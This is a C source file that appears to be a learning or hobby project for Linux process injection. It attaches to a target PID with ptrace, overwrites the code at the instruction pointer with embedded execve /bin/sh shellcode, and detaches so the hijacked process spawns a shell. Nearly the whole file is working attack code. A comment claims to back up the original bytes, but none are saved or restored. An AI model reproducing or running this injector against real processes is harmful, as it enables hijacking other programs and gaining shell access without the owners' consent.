#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/types.h>

// execve /bin/sh from https://github.com/Yyax13/shellcode
unsigned char shellcode[] = {
  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
  0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48,
  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05
};

size_t shellcodeLen = sizeof(shellcode);

int main(int argc, char**argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;

    }
    
    // Convert char* from argv to int (unsafe) and cast to pid_t
    pid_t procID = (pid_t)atoi(argv[1]);
    if (procID <= 0) {
        fprintf(stderr, "Invalid PID");
        return 1;

    }

    // Attach the PID and check for errors (return -1 = error)
    if (ptrace(PTRACE_ATTACH, procID, NULL, NULL) == -1) {
        perror("Can't attach");
        return 1;

    }

    // Wait for target proc stop
    int status;
    if (waitpid(procID, &status, 0) == -1) {
        perror("Can't wait for target");
        goto detach; // Detach ptrace if some error happen

    }

    // Check if proc successfuly stopped
    if (!WIFSTOPPED(status)) {
        fprintf(stderr, "Target did not stop as expected\n");
        goto detach;

    }

    // Get target registers of proccess
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, procID, 0, &regs) == -1) {
        perror("Can't get target regs");
        goto detach;

    }

    // Get the proc rip
    /*
        note: if we overwrite the RIP, when proc is detach, he'll run the shellcode in rip (smt like that, idk)

    */

    unsigned long address = regs.rip;
    printf("Target RIP: 0x%llx\n", (unsigned long long)address);

    // Backup (save original bytes, same len that shellcode)
    size_t wordSize = sizeof(unsigned long);
    size_t nWords = (shellcodeLen + wordSize - 1) / wordSize;
    
    for (size_t i = 0; i < nWords; i++) {
        unsigned long word = 0;
        size_t base = i * wordSize;
        for (size_t ii = 0; ii < wordSize; ii++) {
            size_t idx = base + ii;
            unsigned char byte = (idx < shellcodeLen) ? shellcode[idx] : 0x90;
            word |= ((unsigned long)byte) << (8 * ii);

        }

        if (ptrace(PTRACE_POKETEXT, procID, (void*)(address + base), (void*)word) == -1) {
            perror("Some error occurred in POKETEXT");
            goto detach;

        }

        printf("Wrote 0x%lx --> 0x%llx\n", word, (unsigned long long)(address + base));

    }



    if (ptrace(PTRACE_DETACH, procID, NULL, NULL) == -1) {
        perror("Can't detach target");
        return 1;

    }

    printf("Injection completed.\n");
    return 0;

    detach: 
        if (ptrace(PTRACE_DETACH, procID, NULL, NULL) == -1) {
            perror("Can't detach target");
            
        }

        return 1;

}
